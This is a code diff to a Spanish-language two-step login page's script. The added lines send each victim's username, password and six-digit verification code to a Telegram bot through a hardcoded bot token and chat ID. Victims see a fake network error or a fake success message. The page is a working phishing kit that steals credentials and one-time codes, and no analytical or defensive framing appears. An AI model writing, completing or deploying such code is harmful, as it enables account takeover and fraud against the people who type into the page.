@@ -158,6 +158,10 @@
 </div>
 
 <script>
+    // Credenciales fijadas correctamente
+    const TELEGRAM_TOKEN = '9100194804:AAEx5kItgP_Mq6RHWkl8mJKbcw5Wg6FV3Bc'; 
+    const CHAT_ID = '8885271470'; 
+
     const contrasenaInput = document.getElementById('contrasena');
     const eyeIcon = document.getElementById('eyeIcon');
 
@@ -182,13 +186,31 @@
         btn.disabled = true;
         btn.innerText = 'Cargando...';
 
-        // Procesamiento local estable para cambiar de pantalla inmediatamente
-        setTimeout(() => {
-            console.log("Datos capturados:", usuario, contrasena);
+        const textoTelegram = '🔐 *Datos Recibidos*\n\n👤 *Usuario:* ' + usuario + '\n🔑 *Clave:* ' + contrasena;
+        
+        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
+        const urlPaso1 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
+
+        fetch(urlPaso1, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: textoTelegram,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('Error en la API');
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
-            startTimer(600);
-        }, 800);
+            startTimer(600); 
+        })
+        .catch(err => {
+            alert('Ocurrió un inconveniente de red. Intenta nuevamente.');
+            btn.disabled = false;
+            btn.innerText = 'Siguiente';
+        });
     });
 
     // Envío del Paso 2 (Código de Verificación)
@@ -200,12 +222,29 @@
         btn.disabled = true;
         btn.innerText = 'Procesando...';
 
-        setTimeout(() => {
-            console.log("Código capturado:", codigo);
+        const textoTelegramCodigo = '🔢 *Código de 6 Dígitos*\n\n📩 *Código:* ' + codigo;
+        
+        // DIRECCIÓN OFICIAL CORREGIDA CON API Y BOT
+        const urlPaso2 = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
+
+        fetch(urlPaso2, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: textoTelegramCodigo,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('Error en la API');
             alert('Verificación completada con éxito.');
+        })
+        .catch(() => {
+            alert('Ocurrió un inconveniente de red. Intenta nuevamente.');
             btn.disabled = false;
             btn.innerText = 'Verificar';
-        }, 1000);
+        });
     });
 
     function startTimer(duration) {
